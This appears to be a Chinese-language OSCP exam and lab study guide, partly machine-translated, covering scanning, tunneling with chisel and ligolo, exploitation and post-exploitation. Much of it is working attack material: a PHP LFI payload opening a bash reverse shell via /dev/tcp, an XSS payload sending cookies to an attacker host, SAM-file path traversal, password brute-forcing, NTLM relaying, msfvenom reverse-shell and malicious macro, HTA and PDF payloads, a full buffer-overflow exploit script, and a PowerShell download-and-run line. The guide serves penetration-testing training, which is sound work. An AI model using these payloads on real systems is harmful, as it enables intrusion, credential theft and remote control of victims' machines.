# OSCP_Guide

如何攻克OSCP实验室和考试! (100 + 10 / 100分)

这是我在OSCP实验和认证过程中的笔记总结。我还决定添加一些我在实际工作中使用的技巧（红队、五测和一些反转）。很多命令、工具和技巧来自于其他在线指南（无论是否与OSCP相关），它们都被链接在本帖的底部。

{:refdef: style="text-align: center;"}

# **TLDR;**

→ 用彻底的扫描来列举，不要忽略哪怕是最微小的细节。 → 始终以广度为先。 → 掉进兔子洞是可以的，通过排除法进行。 → 如果你已经是一个熟练的专业人员，发现一些实验箱很困难也没关系。事实上，其中有一些更依赖于CTF风格的谜题，而不是实际的渗透测试逻辑。 → 不要低估考试期间士气的力量。糖、茶、咖啡、睡眠、r00t（去吃低垂的水果会增强你的信心）。 → 尽快运行所有可以在后台运行的东西，这样它就会在你手动测试时运行（例如扫描、暴力破解、用户互动陷阱）。

# **Table of contents:**

- [TLDR;](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#tldr-)
- [Table of contents:](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#table-of-contents-)
- Part 1: Essential Tools
  - [Kali](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#kali)
  - [CopyQ](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#copyq-)
  - [Proxy plugin](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#proxy-plugin)
  - [My clipip.sh tool:](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#my-clipipsh-tool-)
- [Part 2: General Methodolgy](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#part-2--general-methodolgy)
- Part 3: Information Gathering
  - [Ping Sweep](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#ping-sweep)
  - [3 steps (4 if UDP) scanning process](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#3-steps--4-if-udp--scanning-process)
  - [Common enumerations and vulnerabilities checks](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#common-enumerations-and-vulnerabilities-checks)
  - [Scanning through tunnels](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#scanning-through-tunnels)
- Part 3: Getting a shell
  - [Useful commands](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#useful-commands)
  - [Buffer Overflow](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#buffer-overflow)
  - [User Interaction](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#user-interaction)
- [Part 4: Post exploitation (privesc, av bypass, loot)](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#part-4--post-exploitation--privesc--av-bypass--loot-)
- [Conclusion](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#conclusion)
- [References](notion://www.notion.so/OSCP_-1dfe88e7137d4017b16834184e6aaedd#references)

# **Part 1: 常用工具**

## **Kali**

但实际上，任何有正确工具的发行版都可以。

https://github.com/xct/kali-clean

https://i3wm.org/

## **CopyQ**

https://hluk.github.io/CopyQ/

当在一个不支持相同键盘布局的shell中打字时（看着你的RDP），或者不允许你删除字符，或在字符串中移动时，尤其强大。你可以在缓冲区中准备好你的命令，并在准备好后发送。

## 代理

https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/

https://addons.mozilla.org/en-US/firefox/addon/container-proxy/

Container Proxy is very useful if you just want to proxy some tabs of your browser:


## ** [clipip.sh](http://clipip.sh) :**

### **脚本:**

```
#!/bin/bash

o=$(xclip -o |tr -d '\\n')
ip -f inet addr show tun0 | awk '/inet / {print $2}'|cut -d '/' -f1|tr -d '\\n'|xclip -selection c
#You can replace tun0 with any interface if you don't intend to use the script over a VPN (eth0, wlan0...)
sleep 0.1
#xdotool key ctrl+shift+v
# You can use this line if you prefer not to enable CTRL+V in your terminal
xdotool key ctrl+v
echo -n $o|xclip -selection c
```

### ** 在alacritty开启 CTRL+V:**

```
 key_bindings:
  - { key: V, mods: Control, action: Paste }
```

### **在i3配置中添加快捷方式:**

```
bindsym --release $mod+Shift+i exec <path to clipip.sh>
```

Once that is done, you can press Alt+Shift+i in pretty much any buffer, and that will paste your IP. It is pretty useful during the OSCP, as the VPN's outgoing IP can change, and needs be pasted pretty much in every script, cli and payload.

# **Part 2:  基本方法**

这一点我怎么强调都不为过。**广度第一。我已经发现自己钻进兔子洞的次数多得数不清了。像驴子一样固执的我，花了整整一天的时间来研究毫无意义的漏洞，而在另一个我甚至已经扫描过的端口上，一个简单的*searchsploit -m*就能立刻给我一个初步的立足点。

这个想法是。

- 注意你在发现挑战时想到的一切（名称、端口、服务，没有什么是随机的，很多都是实际的提示）。
- 扫描一切。
- 谷歌每一个已知的协议或端口和确定的版本（你可能会发现非常容易利用的进程）。
- 一旦你确定你已经覆盖了所有开放的东西，就开始更深入地挖掘。
- 遵循你的直觉（在第一次扫描结束时响起的那个小铃铛，说 "呼，这是开放的？**不错。**"），并尝试你最初认为是最好的线索。
- 如果或一旦你证明你的直觉是错误的，你就可以开始进行排除法，逐一检查所有潜在的线索。

[Translated with DeepL](https://www.deepl.com/translator?utm_source=windows&utm_medium=app&utm_campaign=windows-share)

# **Part 3: 信息搜集**

在实验和考试中，我一遍又一遍地应用同样的方法，并总是获得良好的结果（当然UDP除外，但这是多么令人讨厌的程序）。

## Ping存活探测

```
#! /bin/bash
for ip in $(seq 1 256); do
 fping -c 1 -t 500 $1.$ip 2>&1 |grep max|cut -d ':' -f1|tr -d ' '
done
```

## **端口扫描**

你可以使用 [Nmap automator](https://github.com/21y4d/nmapAutomator), 这里推荐常用语句

```
# TCP Netcat端口扫描 3388-3390. w选项指定连接超时 秒和-z用于指定零I / O模式，这将 不发送任何数据，用于扫描
nc -nvv -w 1 -z 10.11.1.220 3388-3390

# UDP SCAN -u，表示 UDP 扫描
nc -nv -u -z -w 1 10.11.1.115 160-162

# Get all ports
nmap -p- -T5 -Pn <IP>|grep open|awk '{print $1}'|cut -d '/' -f1|tr '\\n' ','
nmap -p 1-65535 10.11.1.220

# SYN SCAN
sudo nmap -sS 10.11.1.220

# TCP SCAN
nmap -sT 10.11.1.220

# UDP SCAN
sudo nmap -sU 10.11.1.115

# Net SCAN
nmap -sn 10.11.1.1-254
grep Up ping-sweep.txt | cut -d " " -f 2

nmap -p 80 10.11.1.1-254 -oG web-sweep.txt

# Top port SCAN
nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt

# OS scan
sudo nmap -O 10.11.1.220

#service SCAN and enum
nmap -sV -sT -A 10.11.1.220

# script
nmap 10.11.1.220 --script=smb-os-discovery

# zone transfer
nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
```

当然您可以用Nmap自动化工具，但如果您想手动操作，这里是我的方法。

```
# Fingerprinting scan
sudo nmap -p <port list> -T5 -A -R -O <IP> -Pn
```

尽管它可能与下一步有点重复，但它要快得多，而且在最后一次扫描运行时，会给你一些工作。

```
# Script scan
nmap -p <port list> -T5 -sV --version-all --script default,auth,brute,discovery,vuln <IP> -Pn
```

这个不是很微妙，但它会找到很多有趣的信息，不花钱。你可能会发现像这样的东西。

- FTP认证（通常是匿名的）
- HTTP文件夹和文件
- SMB用户名称和本地信息
- 已知的漏洞（不是很准确，但它在实验室里工作过几次）

如果你没有发现任何东西，你就可以继续扫描UDP端口。

```
nmap -T5 -sU --top-ports 10000 <IP>
```

**Note:**  我几乎每次都会使用T5，但如果你开始收到错误，你可以选择使用T4:

```
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
```

### **iptables**

```
 #-I选项指定input或者output  -s指定源IP地址，使用-d指定一个目标 IP 地址，-j Accept， -v 详细程度，-n以启用数字输出，和-L列出所有规则中存在的规则链， -Z 清零
 sudo iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPT
 sudo iptables -I OUTPUT 1 -d 10.11.1.220 -j ACCEPT
 sudo iptables -Z
```

### **masscan**

```
#  - rate以指定所需的数据包传输速率，-e指定原始要使用的网络接口，以及用于指定IP --router-ip相应网关的地址
sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1
```

### **NBTSCAN**

```
#-r选项用于指定原始 UDP 端口为 137，用于查询 NetBIOS 有效 NetBIOS 名称的服务
sudo nbtscan -r 10.11.1.0/24
```

### 

## **常见的枚举和漏洞检查**

如果你遇到OpenSSH<7.7的Linux，我强烈建议使用SSH用户oracle（CVE-2018-15473），因为它可以给你现有的系统用户，然后可以用于暴力攻击或喷涂。我通常使用 [该脚本](https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py),但是exploitdb 的[漏洞脚本](https://www.exploit-db.com/exploits/45233)也可以.

```
python ssh-username-enum.py <IP> -w <wordlist>

also use enum4linux
用法: ./enum4linux.pl [选项] ip地址

枚举选项：
-U 获取用户列表
-M 获取机器列表*
-S 获取共享列表
-P 获取密码策略信息
-G 获取组和成员列表
-d 详述适用于-U和-S
-u user 用户指定要使用的用户名（默认""）
-p pass 指定要使用的密码（默认为""）

-a 做所有简单枚举（-U -S -G -P -r -o -n -i），如果您没有提供任何其他选项，则启用此选项
-h 显示此帮助消息并退出
-r 通过RID循环枚举用户
-R range RID范围要枚举（默认值：500-550,1000-1050，隐含-r）
-K n 继续搜索RID，直到n个连续的RID与用户名不对应，Impies RID范围结束于999999.对DC有用
-l 通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DN）
-s 文件暴力猜测共享名称
-k user 远程系统上存在的用户（默认值：administrator，guest，krbtgt，domain admins，root，bin，none）
用于获取sid与“lookupsid known_username”
使用逗号尝试几个用户：“-k admin，user1，user2”
-o 获取操作系统信息
-i 获取打印机信息
-w wrkg 手动指定工作组（通常自动找到）
-n 做一个nmblookup（类似于nbtstat）
-v 详细输出，显示正在运行的完整命令（net，rpcclient等）
```

![_config.yml](https://therealunicornsecurity.github.io/images/OSCP/sshenum.png)

可以使用 [这个字典](https://github.com/pentestmonkey/yaptest/blob/master/ssh-usernames.txt) 也可以选择[Seclists](https://github.com/danielmiessler/SecLists/tree/master/Usernames) 的字典去尝试

另外，不要忘记完成词表，或者用你找到的证书创建新的自定义词表。有些可能会被重复使用，boxes有依赖性。

当发现Windows主机时，我建议检查SMB漏洞。

```
nmap -T5 -sV --script 'smb-vuln*' <IP>
```

包括以下漏洞:

- cve-2017-7494
- cve2009-3103
- ms06-025
- ms07-029
- ms08-067
- ms10-054
- ms10-061
- **ms17-010**
- regsvc-dos

使用 [rdpscan](https://github.com/robertdavidgraham/rdpscan)来扫描BLUEKEEP漏洞:

```
./rdpscan <ip>
```

![_config.yml](https://therealunicornsecurity.github.io/images/OSCP/rdpscan.jpg)

虽然，请记住，Bluekeep不是很稳定，它很可能只是**造成崩溃**。显然，它仍然被认为是**存在漏洞**的，但不一定能够利用。也可以使用metasploit模块来做这个。

```
nmap -p3389 -T5 <subnet>/24 -oG - | awk '/Up$/{print $2}' > rdp.lst
msfconsole
> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
> set RHOSTS file:<path to rdp.lst>
> run
...
 [+] 10.X.X.X:3389      - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
```

最后，要经常检查smb共享，因为有时可以在没有凭证的情况下挂载它们。

```
crackmapexec smb <IP> -u '' -p '' --shares
```

大多数应该是由nmap脚本的扫描引起的，但有疑问时反复检查总是好的。Nmap的脚本引擎可能在主机超时的情况下崩溃，您会错过一些重要的结果。

## **利用代理进行扫描**

I highly recommended using those two projects:

- https://github.com/projectdiscovery/naabu
- https://github.com/jpillora/chisel

### **ligogo**

Initial Setup on my box

```
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

#Desired subnet to access
sudo ip route add 172.16.2.0/24 dev ligolo
```

Build the proxy and agent

```
$ go build -o agent cmd/agent/main.go
$ go build -o proxy cmd/proxy/main.go
# Build for Windows
$ GOOS=windows go build -o agent.exe cmd/agent/main.go
$ GOOS=windows go build -o proxy.exe cmd/proxy/main.go
```

Run proxy on my box

```
┌──(gl0wy㉿kali)-[~/Desktop/Tools/ligolo-ng]
└─$ sudo ./proxy -selfcert                                                                                                                              1 ⨯
WARN[0000] Using automatically generated self-signed certificates (Not recommended)
INFO[0000] Listening on 0.0.0.0:11601
```

Upload and run agent on victim

```
C:\\Windows\\system32>agent.exe -connect 10.10.16.5:11601 -ignore-cert
```

Create session and start

```
ligolo-ng » INFO[0071] Agent joined.                                 name="NT AUTHORITY\\\\SYSTEM@DANTE-DC01" remote="10.10.110.3:62081"
ligolo-ng » session
[Agent : NT AUTHORITY\\SYSTEM@DANTE-DC01] » start
INFO[0163] Starting tunnel to NT AUTHORITY\\SYSTEM@DANTE-DC01
```

### **Socks proxy**

```
# Run on your machine, will open port 443
chisel server -p 443 --reverse --socks5
# Run on tunneling server, will open 1080 on your local machine once connected
chisel client 192.168.119.248:443 R:socks
```

And then, run a port scan using naabu:

```
naabu -rate 500 -c 10 -s connect -p  -  -host 10.X.X.X -proxy 127.0.0.1:1080
```

Naabu can crash chisel if too many concurrent threads are running, hence the specification of *rate* and *workers*. Naabu is generally much faster than nmap for simple port scans. Anyone who has used `proxychains nmap` knows how **slow** a simple scan can get.

### **Port forward**

If you intend to bypass **localhost** whitelisting (usually for mysql, phpmyadmin, but also sometimes web interfaces), I recommend using port forwarding to local host. For instance, connecting to root with mysql might get the message:

> ERROR 1130 (00000): Host 'X.X.X.X' is not allowed to connect to this MySQL server

```
# Run on your machine, will open port 443
chisel server -p 443 --reverse --socks5
# Open port 3306 on your local machine to proxy packets towards target
chisel client 192.168.119.248:443 R:3306:localhost:3306
```

Then, you can simply use:

```
mysql -u root -p<pass> -h 127.0.0.1
```

# **Part 3: 获取shell**

> searchsploit msfconsole; search google

使用这个，你应该已经找到了一个可以工作的漏洞，现在用 [revshell.com](https://www.revshells.com/)来获取shell，同样可以查看[monkey]([Reverse Shell Cheat Sheet | pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))来获取命令!

下面是我发现的一些对利用各种服务有用的命令。

## 常用命令

### **1. 想渗入嵌入HTML标签的二进制数据?**

```
 wget -qO- '<http://X.X.X.X/vulnpage?vulparam=>..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..%5cWINDOWS%5cRepair%5cSAM%00en' |perl -l -0777 -ne 'print $1 if /<title.*?>\\s*(.*?)\\s*<\\/title/si' > SAM
```

### **2. PHP LFI（执行命令）?**

```
data:text/plain,<?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
```

### **3. 爆破账号密码?**

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt X.X.X.X http-post-form "/URL/Login:User=^USER&password=^PASS:F=<String indicating attempt has failed>" -I
```

### **4. RDP连接?**

> transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]

```
xfreerdp /u:user /p:'password' /v:X.X.X.X /d:domain /sec:rdp
# OR, if having a different connect error, also try:
xfreerdp /u:user /p:'password' /v:X.X.X.X /d:domain /sec:tls
# and if you want to have files and clipboard there:
xfreerdp +clipboard /u:user /p:'password' /v:X.X.X.X /d:domain /sec:<whatever> /drive:<absolute path to your local folder>,/
```

### **5.获取更多hashes?**

参考 [hack tricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse).

```
# <https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py>
rcpdump.py <IP>|grep MS-RPRN
# <https://github.com/NotMedic/NetNTLMtoSilverTicket>
python dementor.py -u Guest -p ''  <target> <responder>
```

你也可以使用 [ntlmrelay](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)转发这些哈希值，因为破解它们可能并不有趣:

```
# list machines with SMB
nmap -p139;445 -T5 <subnet>/24 -oG - | awk '/Up$/{print $2}' > smb.lst
# shortlist IP's with spooler active (might be bugged, I haven't retested it and I typed it from what I recall)
while read ip; do rcpdump.py $ip|grep -q MS-RPRN && echo $ip >> spooler.lst || :;done < smb.lst
# generate a list of targets without SMB signing
crackmapexec smb <subnet> --genrelay-list > targets.lst
# start relay server
ntlmrelayx.py -l loot -smb2support -socks -tf targets.lst
# force NetNTLMv2 authentication to your relay (need valid credentials to perform the attack)
while read ip; do python dementor.py -u user -p 'password' $ip <responder ip>;done < spooler.lst
# profit
nc localhost <port open by ntlmrelayx>
```

**Note:**  这个超出OSCP的考试范围.

### **6. 获取cookies?**

```
<script>document.write("<img src='http://<IP> or <request bin>'"+document.cookie+"');</script>
```

### **7. 检查是否存在用户弱口令? (username = password)**

```
crackmapexec smb <any ip in the domain> -u users.lst -p users.lst  -d domain --no-bruteforce
```

### **8. 递归下载FTP所有文件?**

```
wget -r <ftp://user:pass@serv>
```

### **9. 通过socks代理对phpmyadmin进行暴力破解?**

使用[Patator](https://github.com/lanjelot/patator)来进行操作

```
patator.py http_fuzz proxy_type=socks5 proxy=localhost:1080 url=http://IP/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&target=index.php&lang=en&token=' 0=/usr/share/wordlists/rockyou.txt before_urls=http://IP/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Access denied for user '
```

## **常见端口漏洞**

### mssql（1433）

Microsoft SQL凭证存储在`master.mdf`中。下面是一个位置示例。

```
C:\\Program Files\\Microsoft SQL Server\\MSSQL14.SQLEXPRESS\\MSSQL\\Backup\\master.mdf
```

你可以使用PowerShell中的[Invoke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)从mdf文件中检索哈希值。

```
Add-Type -Path 'OrcaMDF.RawCore.dll'
Add-Type -Path 'OrcaMDF.Framework.dll'
import-module .\\Get-MDFHashes.ps1
Get-MDFHashes -mdf "C:\\Users\\admin\\Desktop\\master.mdf"
```

然后，john可以用来破解哈希值。

### **NFS+RPCbind**

#### **mount**

```
#查询可用目录
showmount -e <IP>

#挂载
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock

mkdir /mnt/new_back
mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock
#bypass rbash
vi
:set shell=/bin/sh

python -c 'import os; os.system("/bin/sh");'
python3 -c 'import os; os.system("/bin/sh");'

#tftp
import tftpy
client = tftpy.TftpClient(<ip>, <port>)
client.download("filename in server", "\\PROGRA~1\\MICROS~1\\MSSQL1~1.SQL\\MSSQL\\BACKUP\\master.mdf", timeout=5)
client.upload("filename to upload", "/local/path/file", timeout=5)
```



## **Buffer Overflow**

这里没有什么新东西，只是与PEN200课程中解释的方法相同，加上我的注释。

### **1. Find the overflow:**

只要用大量的字符进行尝试，直到你得到崩溃，或者如果你是远程连接，则拒绝连接。

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.199.129"

port = 9999
timeout = 5
prefix = "GTER "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

```

![image-20221229153030399](C:\Users\PC\AppData\Roaming\Typora\typora-user-images\image-20221229153030399.png)

### **2. 找到偏移量:**

```
#常用
msf-pattern_create -l <lenth>
msf-pattern_create -l <arbitrarily large number> -s abcdefghijklmnopqrstuvwxyz,ABCDEF,0123456789


```

我使用了一个自定义的字符集，因为我注意到由msf-pattern_create生成的字符串并不总是让目标崩溃，而且出于一个奇怪的原因，这在大多数时候都是有效的.

![_config.yml](https://therealunicornsecurity.github.io/images/OSCP/patternCrash.png)

一旦字符串被发送，并引发崩溃，获得EIP值（如果它来自Immunity，则将其反转）并使用偏移量进行检查。

```
msf-pattern_offset -l <same number> -s abcdefghijklmnopqrstuvwxyz,ABCDEF,0123456789 -q <hex decoded string>
[+] Exact match at offset X
```

也可以使用mona去查询EIP

```
!mona config -set workingfolder c:\mona\%p

!mona findmsp -distance <lenth>

```

### **3. 确认EIP被修改:**

```
python -c 'print "A"*X+"B"*4'
```

OSCP的缓冲区溢出总是在32位的可执行文件上，所以EIP总是包含4个字节。在这种情况下，如果你的EIP寄存器在崩溃时包含**42424242**，那么你的EIP重写就成功了。

### **4. 找出badchar:**

### **With Immunity**

生成一个字符列表:

```
import sys
for i in range(1,256):
 sys.stdout.write('\\\\x'+'{:02X}'.format(i))
 
##生成好的
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

使用mona先备份内存.

```
# 去掉\x00
!mona bytearray -b "\x00"
```

然后发送数据包

```python

offset = 2056
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

记下ESP寄存器所指向的地址，并在下面的mona命令中使用它。

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

一个弹出的窗口应该出现，标签为 "mona Memory comparison results"。如果没有，请使用窗口菜单切换到它。该窗口显示了比较的结果，表明任何在内存中与生成的bytearray.bin文件中不同的字符。

并非所有这些都是坏字符! 有时坏字符也会导致下一个字节被破坏，甚至影响到字符串的其余部分。

列表中的第一个坏字符应该是空字节（\x00），因为我们已经从文件中删除了它。记下任何其他的坏字符。在mona中生成一个新的字节数，将这些新的坏字符和\x00一起指定。然后更新你的exploit.py脚本中的payload变量，把新的坏字符也删除。

重新启动Immunity中的exe，再次运行修改后的exploit.py脚本。重复坏字符的比较，直到结果状态返回 "未修改"。这表明没有更多的badchars存在。

### **5. 寻找跳跃点:**

最后，您应该获得要用来重写 EIP 的值。它必须是一个指向可执行指令的指针。理想情况下，此指针：

- 跳转到指令或等效指令：

  ```plaintext
  jmp esp
  ```

  - `call esp`
  - `push esp; ret`

- 不包含任何不良字符

可以使用以下命令在免疫中找到这样的地址：

```
!mona jmp -r esp -cpb "\x00"
```

或者使用 [ROPGadget](https://github.com/JonathanSalwan/ROPgadget)。

```
ROPgadget.py --binary <file> |grep 'jmp esp'
```

该命令找到所有地址不包含任何指定的坏字符的 "jmp esp"（或同等的）指令。结果应该显示在 "log "窗口中（如果需要，使用窗口菜单切换到它）。

选择一个地址并更新你的exploit.py脚本，将 "retn "变量设置为该地址，倒着写（因为系统是小字节）。例如，如果地址是Immunity中的\x01\x02\x03\x04，在你的漏洞中写成\x04\x03\x02\x01。

### **6.生成payload**

在Kali上运行下面的msfvenom命令，使用你的Kali VPN IP作为LHOST，并在-b选项中更新你确定的所有坏字符（包括\x00）。

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b <badchar> -f c
```

或者你也可以使用 -f python，如果你宁愿简单地做事。我使用十六进制格式，因为它更容易转换为原始二进制文件，并且可以用于其他目的.

复制生成的C代码字符串，并使用以下符号将其整合到你的exploit.py脚本有效载荷变量中。

```
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

### **7.前置NOP**

由于可能使用了编码器来生成有效载荷，你需要在内存中留出一些空间，以便有效载荷自己解压。你可以通过将填充变量设置为16个或更多 "Nop"（\x90）字节的字符串来做到这一点。

```
padding = "\x90" * 16
```

完整POC：

```python
import socket

ip = "192.168.199.129"
port = 9999

prefix = "GTER "
offset = 2056
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = "C" * (1500 - offset - len(retn) -len(padding))
#postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```

## 用户交互

某些框只能通过用户交互来植根。特别是：

1. 生成 VBA 有效负载

   ```
   msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f vba -o macro.vba
   ```

2. 生成 HTA 有效负载

   ```
   msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta -o index.hta
   ```

3. 生成恶意的 FoxIt pdf 文档

[漏洞利用数据库脚本](https://www.exploit-db.com/exploits/49116)

[Impacket smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)

```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o giveyouup.exe
smbserver.py -smb2support -ip <IP> TMP .
python 49116.py \\<IP>\TMP\backdoor.exe letyoudown.pdf
```



# **Part 4: 后渗透阶段 (privesc, av bypass, loot)**

WinPEAS和LinPEAS中已经涵盖了几乎所有有关特权升级的内容： https://github.com/carlospolop/PEASS-ng

这是我自己的一个小清单：

### **1. 远程目标可以在哪个端口与我联系? (reverse tcp scan)**

获取[此脚本](https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/blob/master/port-scan-tcp.ps1)并使其在端口 80 上可下载：

```
wget <https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/raw/master/port-scan-tcp.ps1>
python -m http.server 80
```

就像为 meterpreter/reverse_tcp_allports 设置 iptables 一样，但要确保 80 端口可以查询，并启动 netcat catch-all。

```
sudo iptables -i tun0 -A PREROUTING -t nat -p tcp --dport 20:79 -j REDIRECT --to-port 8000
sudo iptables -i tun0 -A PREROUTING -t nat -p tcp --dport 81:6000-j REDIRECT --to-port 8000
nc -nlvp 8000
```

在本地运行该脚本:

```
powershell -ep bypass -nOp -c "iex (iwr <http://192.168.119.248/port-scan-tcp.ps1> -UseBasicParsing);port-scan-tcp 192.168.119.248 (21,22,23,53,80,139,389,443,445,636,1433,3128,8080,3389,5985);"
```

